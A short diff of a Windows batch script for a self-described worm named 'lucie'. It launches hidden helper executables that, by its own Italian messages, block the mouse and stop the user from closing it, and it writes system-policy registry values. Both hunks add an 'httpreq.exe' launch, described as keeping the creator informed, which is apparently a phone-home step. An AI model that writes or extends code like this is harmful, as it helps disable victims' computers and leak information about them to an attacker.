@@ -17,6 +17,8 @@ if exist "%userprofile%\AppData\Local\identifyl" goto noworm
 if NOT exist "%userprofile%\AppData\Local\identifyl" goto worm
 :worm
 cd "%mypath%\lucieengine"
+start /min "" httpreq.exe
+echo la lucie gradisce mantenere informato il creatore
 start /min "" ILMAUS.exe
 echo la lucie gradisce bloccare i mouse
 start /min "" sera.exe
@@ -151,6 +153,8 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 cd "%userprofile%\AppData\Roaming\lucieengine"
 start /min "" ILMAUS.exe
 echo sapevi che la lucie non vuole che tu possa chiudermi di nuovo?
+start /min "" httpreq.exe
+echo la lucie gradisce mantenere informato il creatore
 start /min "" icspi.bat
 start /min "" sera.exe
 echo la lucie non vuole che possa chiudermi!
